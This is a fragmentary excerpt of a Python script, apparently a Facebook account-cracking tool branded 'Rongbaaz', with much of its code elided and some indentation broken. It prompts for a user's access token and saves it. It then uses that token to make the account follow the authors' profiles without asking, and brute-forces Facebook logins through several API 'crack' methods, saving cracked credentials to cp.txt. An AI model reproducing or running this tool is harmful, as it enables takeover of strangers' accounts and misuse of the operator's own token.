...
def logs():
  ...
  print((p+" ["+k+"03"+p+"] How To Get Token"))
...
def log_token():
    ...
    try:
        ...
        zedd.write(toket)
        zedd.close()
        print((p+" ["+k+"•"+m+"•"+p+"] Login Success!"))
        jalan((p+" ["+k+"•"+m+"•"+p+"] Please like our page:)"))
        os.system('xdg-open https://www.facebook.com/100466858653425')
        bot_follow()
        menu()
    except KeyError:
...
komtwol = random.choice(["Hey we are Rongbaaz", "Family", "Bro, don't you have a boyfriend?", "That's cool, Oky", "we!", "ar worok to Cyber speech", "if thing you are bad ", "So?", "Rongbaaz Tm your dad", "Hope you will be a successful person", "welcome , to our family"])
...
def bot_follow():
	try:
		...
		logs()
	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Rongbaaz
	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Tm
	requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + toket) # oky
...
def menu():
    ...
    os.system("clear")
    banner()
    print((m+"\n ["+p+" Welcome User \033[1;31m"+nama+m+" ]"+p))
...
def pilihcrack(file):
  print("\n\033[0;92m [ \033[1;37mSelect Methode Crack\033[1;31m ]\033[1;37m")
  print((p+" ["+k+"01"+p+"] Crack With Api.Facebook (Fast)"))
  print((p+" ["+k+"02"+p+"] Crack With Api.Facebook + TTL "))
  print((p+" ["+k+"03"+p+"] Crack With Mbasic.Facebook (Bast)"))
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : rongbaaz,786786,102030"))
				self.pwlist()
				break
			elif f=="d":
				try:
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : rongbaaz,786787,102030"))
				self.pwlist()
				break
			elif f=="d":
				try:
...
class bapi:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m Rongbaaz > %s • %s %s               "%(username,password,N)))
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m Rongbaaz > %s • %s\n Rongbaaz > https://www.facebook.com/%s\n %s               "%(username,password,username,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print("\r\x1b[0;33m Rongbaaz > %s • %s • %s   "%(username,password,ttl))
        save = open("cp.txt", "a+")
